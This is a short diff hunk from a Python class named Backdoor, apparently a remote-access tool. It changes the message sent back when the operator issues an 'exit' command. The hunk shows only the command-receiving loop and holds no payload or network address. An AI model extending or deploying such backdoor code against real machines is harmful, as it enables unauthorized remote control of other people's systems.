@@ -82,7 +82,7 @@ class Backdoor:
 			if self.connected:
 				command = self.reliable_recive()
 				if command == "exit":
-					self.reliable_send("")
+					self.reliable_send("Exiting...")
 					self.connected = False
 					print(self.connected)
 
